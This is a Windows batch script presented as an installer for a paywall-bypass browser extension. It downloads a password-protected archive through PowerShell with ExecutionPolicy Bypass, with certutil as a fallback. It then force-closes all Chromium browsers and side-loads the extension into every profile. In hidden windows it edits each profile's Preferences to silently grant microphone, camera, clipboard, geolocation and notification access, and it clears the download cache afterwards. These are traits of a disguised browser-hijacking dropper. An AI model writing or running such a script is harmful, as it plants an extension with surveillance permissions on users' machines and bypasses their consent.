@echo off
setlocal EnableDelayedExpansion

:: ============================================
:: Bypass Paywalls Chrome Extension Installer
:: Auto-download, extract, and install with permissions
:: ============================================

:: === CONFIGURATION ===
:: Replace this URL with your actual download link
set "DOWNLOAD_URL=YOUR_DOWNLOAD_URL_HERE"
set "ARCHIVE_PASSWORD=iYJ9ot8vMhCqcL4iFpga"
set "EXT_ID=bypass-paywalls"
set "FIXED_EXT_ID=bbbbbbbbccccccccddddddddeeeeeeee"

:: Temporary directories
set "TEMP_DIR=%TEMP%\bp_install_%RANDOM%"
set "INSTALL_DIR=%APPDATA%\BypassPaywalls\Extension"

mkdir "%TEMP_DIR%" 2>nul
mkdir "%INSTALL_DIR%" 2>nul

echo ============================================
echo Bypass Paywalls Extension Installer
echo ============================================
echo.

:: ============================================
:: Step 1: Download the archive
:: ============================================
echo [1/5] Downloading extension package...

set "DL_SUCCESS=0"
set "ARCHIVE_FILE=%TEMP_DIR%\extension.zip"

:: Method 1: PowerShell Invoke-WebRequest
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ARCHIVE_FILE%' -UseBasicParsing -ErrorAction Stop;exit 0}catch{exit 1}" 2>nul
if %ERRORLEVEL% equ 0 set "DL_SUCCESS=1"

:: Method 2: PowerShell WebClient (fallback)
if "!DL_SUCCESS!"=="0" (
    echo Trying alternative download method...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%','%ARCHIVE_FILE%');exit 0}catch{exit 1}" 2>nul
    if !ERRORLEVEL! equ 0 set "DL_SUCCESS=1"
)

:: Method 3: certutil (built-in Windows tool)
if "!DL_SUCCESS!"=="0" (
    echo Trying certutil download method...
    certutil -urlcache -split -f "%DOWNLOAD_URL%" "%ARCHIVE_FILE%" >nul 2>&1
    if exist "%ARCHIVE_FILE%" set "DL_SUCCESS=1"
)

if "!DL_SUCCESS!"=="0" (
    echo ERROR: Failed to download extension package
    echo Please check the download URL and your internet connection
    goto :cleanup_error
)

echo Download completed successfully
echo.

:: ============================================
:: Step 2: Extract password-protected archive
:: ============================================
echo [2/5] Extracting archive with password...

set "EXTRACT_SUCCESS=0"

:: Method 1: PowerShell with password (for password-protected zips)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Add-Type -AssemblyName System.IO.Compression.FileSystem;try{$zip=[System.IO.Compression.ZipFile]::OpenRead('%ARCHIVE_FILE%');$zip.Entries|ForEach-Object{[System.IO.Compression.ZipFileExtensions]::ExtractToFile($_,('%INSTALL_DIR%\'+$_.FullName),$true)};$zip.Dispose();exit 0}catch{exit 1}" 2>nul
if %ERRORLEVEL% equ 0 set "EXTRACT_SUCCESS=1"

:: Method 2: Try with 7-Zip if installed
if "!EXTRACT_SUCCESS!"=="0" (
    if exist "%ProgramFiles%\7-Zip\7z.exe" (
        echo Trying 7-Zip extraction...
        "%ProgramFiles%\7-Zip\7z.exe" x "%ARCHIVE_FILE%" -o"%INSTALL_DIR%" -p%ARCHIVE_PASSWORD% -y >nul 2>&1
        if exist "%INSTALL_DIR%\manifest.json" set "EXTRACT_SUCCESS=1"
    )
)

:: Method 3: Try with WinRAR if installed
if "!EXTRACT_SUCCESS!"=="0" (
    if exist "%ProgramFiles%\WinRAR\UnRAR.exe" (
        echo Trying WinRAR extraction...
        "%ProgramFiles%\WinRAR\UnRAR.exe" x -p%ARCHIVE_PASSWORD% -y "%ARCHIVE_FILE%" "%INSTALL_DIR%\" >nul 2>&1
        if exist "%INSTALL_DIR%\manifest.json" set "EXTRACT_SUCCESS=1"
    )
)

:: Method 4: COM Shell.Application (fallback, no password support)
if "!EXTRACT_SUCCESS!"=="0" (
    echo Trying Shell.Application extraction...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "$s=New-Object -COM Shell.Application;$z=$s.NameSpace('%ARCHIVE_FILE%');$d=$s.NameSpace('%INSTALL_DIR%');$d.CopyHere($z.Items(),16)" 2>nul
    if exist "%INSTALL_DIR%\manifest.json" set "EXTRACT_SUCCESS=1"
)

:: Handle nested folders (if extension is in a subfolder)
for /d %%D in ("%INSTALL_DIR%\*") do (
    if exist "%%D\manifest.json" (
        xcopy "%%D\*" "%INSTALL_DIR%\" /E /I /Y >nul 2>&1
        rd /s /q "%%D" 2>nul
    )
)

if not exist "%INSTALL_DIR%\manifest.json" (
    echo ERROR: Failed to extract extension or manifest.json not found
    goto :cleanup_error
)

echo Extraction completed successfully
echo.

:: ============================================
:: Step 3: Close all browsers
:: ============================================
echo [3/5] Closing browsers...

:: Graceful close first
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "Get-Process chrome,msedge,brave,vivaldi,opera -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }" 2>nul
timeout /t 2 /nobreak >nul 2>&1

:: Force kill if still running
taskkill /F /IM chrome.exe /T >nul 2>&1
taskkill /F /IM msedge.exe /T >nul 2>&1
taskkill /F /IM brave.exe /T >nul 2>&1
taskkill /F /IM vivaldi.exe /T >nul 2>&1
taskkill /F /IM opera.exe /T >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1

echo Browsers closed
echo.

:: ============================================
:: Step 4: Install to all browsers
:: ============================================
echo [4/5] Installing extension to all browsers...

set "BROWSERS[0]=%LOCALAPPDATA%\Google\Chrome\User Data"
set "BROWSERS[1]=%LOCALAPPDATA%\Microsoft\Edge\User Data"
set "BROWSERS[2]=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"
set "BROWSERS[3]=%LOCALAPPDATA%\Vivaldi\User Data"
set "BROWSERS[4]=%APPDATA%\Opera Software\Opera Stable"
set "BROWSERS[5]=%APPDATA%\Opera Software\Opera GX Stable"
set "BROWSERS[6]=%LOCALAPPDATA%\Chromium\User Data"

set "INSTALL_COUNT=0"

for /L %%i in (0,1,6) do (
    set "BROWSER_PATH=!BROWSERS[%%i]!"
    if exist "!BROWSER_PATH!" (
        echo Installing to browser: !BROWSER_PATH!
        for /d %%P in ("!BROWSER_PATH!\*") do (
            set "PROFILE_NAME=%%~nxP"
            if /i "!PROFILE_NAME!"=="Default" (
                call :install_profile "!BROWSER_PATH!\!PROFILE_NAME!"
                set /a INSTALL_COUNT+=1
            )
            if /i "!PROFILE_NAME:~0,7!"=="Profile" (
                call :install_profile "!BROWSER_PATH!\!PROFILE_NAME!"
                set /a INSTALL_COUNT+=1
            )
        )
        call :install_profile "!BROWSER_PATH!\Default"
    )
)

echo Extension installed to !INSTALL_COUNT! browser profiles
echo.

:: ============================================
:: Step 5: Complete
:: ============================================
echo [5/5] Installation complete!
echo.
echo Extension installed to: %INSTALL_DIR%
echo Browser profiles updated: !INSTALL_COUNT!
echo.
echo Please restart your browser to see the extension.
echo.

goto :cleanup_success

:: ============================================
:: FUNCTION: Install to profile + grant permissions
:: ============================================
:install_profile
set "PROFILE_PATH=%~1"
if not exist "%PROFILE_PATH%" exit /b 0

:: Create External Extensions directory
set "EXT_JSON_DIR=%PROFILE_PATH%\External Extensions"
mkdir "%EXT_JSON_DIR%" 2>nul

:: Create extension JSON file
set "JSON_PATH=%EXT_JSON_DIR%\%FIXED_EXT_ID%.json"
set "ESCAPED_PATH=%INSTALL_DIR:\=\\%"
(
echo {"external_crx":"%ESCAPED_PATH%","external_version":"1.0.0"}
) > "%JSON_PATH%" 2>nul

:: Grant permissions via Preferences modification
set "PREFS_FILE=%PROFILE_PATH%\Preferences"
if not exist "%PREFS_FILE%" exit /b 0

:: Use PowerShell to modify Preferences JSON and grant all permissions
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$p='%PREFS_FILE%';$e='%FIXED_EXT_ID%';try{$j=Get-Content $p -Raw|ConvertFrom-Json;" ^
  "if(-not $j.profile){$j|Add-Member -N 'profile' -V @{} -F};" ^
  "if(-not $j.profile.content_settings){$j.profile|Add-Member -N 'content_settings' -V @{} -F};" ^
  "if(-not $j.profile.content_settings.exceptions){$j.profile.content_settings|Add-Member -N 'exceptions' -V @{} -F};" ^
  "$o=\"chrome-extension://$e,*\";$s=@{setting=1;last_modified=[long]((Get-Date)-[datetime]'1970-1-1').TotalMilliseconds};" ^
  "@('media_stream_mic','media_stream_camera','notifications','autoplay','clipboard','geolocation')|%%{" ^
  "if(-not $j.profile.content_settings.exceptions.$_){$j.profile.content_settings.exceptions|Add-Member -N $_ -V @{} -F};" ^
  "$j.profile.content_settings.exceptions.$_|Add-Member -N $o -V $s -F};" ^
  "$j|ConvertTo-Json -D 100 -C|Set-Content $p -Enc UTF8}catch{}" 2>nul

exit /b 0

:: ============================================
:: Cleanup - Success
:: ============================================
:cleanup_success
:: Clear download cache
certutil -urlcache -delete "%DOWNLOAD_URL%" >nul 2>&1

:: Remove temp files
rd /s /q "%TEMP_DIR%" 2>nul

echo ============================================
echo Installation completed successfully!
echo ============================================
pause
exit /b 0

:: ============================================
:: Cleanup - Error
:: ============================================
:cleanup_error
:: Remove temp files
rd /s /q "%TEMP_DIR%" 2>nul

echo ============================================
echo Installation failed. Please check the errors above.
echo ============================================
pause
exit /b 1
